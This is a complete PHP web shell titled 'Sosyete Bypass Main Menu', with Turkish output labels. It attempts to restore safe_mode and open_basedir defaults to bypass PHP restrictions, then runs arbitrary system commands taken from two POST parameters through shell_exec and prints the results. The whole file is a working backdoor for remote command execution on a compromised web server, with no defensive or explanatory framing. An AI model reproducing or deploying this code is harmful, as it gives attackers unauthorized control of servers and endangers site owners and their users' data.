<?php
echo "<b><font color=red>Sosyete Bypass Main Menu</font></b><br>";

ini_restore("safe_mode");
ini_restore("open_basedir");
$fuck=shell_exec($_POST['sosyete']); 
$mokoko=shell_exec($_POST['fuck']); 
echo "<pre><h4>";
echo "<b><font color=red>Komut Sonucu </font></b><br>"; 
echo $fuck;
echo $mokoko;
echo "</h4></pre>";

?>
